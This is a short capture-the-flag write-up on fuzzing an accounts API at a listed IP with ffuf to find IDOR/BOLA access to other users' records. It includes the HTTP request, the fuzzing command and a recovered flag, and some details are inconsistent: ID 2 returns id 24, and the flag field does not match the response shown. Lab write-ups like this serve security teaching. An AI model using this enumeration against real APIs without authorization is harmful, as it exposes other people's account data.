
# CTF Write-Up: Account Endpoint Fuzzing

## Objective

Fuzz the account API endpoint to identify valid account IDs and retrieve hidden CTF flags exposed in account records.

## Target Information

- **Target IP:** `16.16.228.207`
- **Port:** `5000`
- **Endpoint:** `/api/accounts/{id}`
- **HTTP Method:** `GET`
- **Authentication:** Bearer JWT

## Step 1: Analyze the Initial Accounts API Requests

```http
GET /api/accounts/2 HTTP/1.1
Host: 16.16.228.207:5000
Authorization: Bearer <JWT_TOKEN>
```

The server returned `HTTP/1.1 200 OK` with the following response:

```json
{
  "balance_cents": 125000,
  "iban": "BB00CAReOL00023",
  "id": 24,
  "owner_username": "bob"
}
```


## Step 2: Fuzz the Endpoint Using ffuf

Use `ffuf` to test the account IDs against the API.

```bash
ffuf \
  -u http://16.16.228.207:5000/api/accounts/FUZZ \
  -H "Authorization: Bearer <JWT_TOKEN>" \
  -w account_ids.txt \
  -mc 200,403,404
```



## Step 3: Analyze the Responses

Review the results and prioritize requests returning `200 OK`.

Inspect the response bodies for:

- Valid account IDs.
- Account ownership information.
- Unexpectedly accessible account records.
- Flags matching the pattern `flag{...}`.

A successful HTTP response does not necessarily indicate a vulnerability. Verify whether the authenticated user is authorized to access each returned account.

## Step 4: Verify Potential BOLA/IDOR

If an account ID returns another user's information, determine whether the API enforces object-level authorization.

A vulnerability may exist if an authenticated user can access another user's account details simply by changing the account ID in the URL.

Document the affected IDs, response evidence, and authorization behavior.

## Findings

The request to `/api/accounts/24` returned account information and exposed a CTF flag in the `owner_username` field.

**Flag recovered:**

`flag{inm_you_got_the_first_flag}`

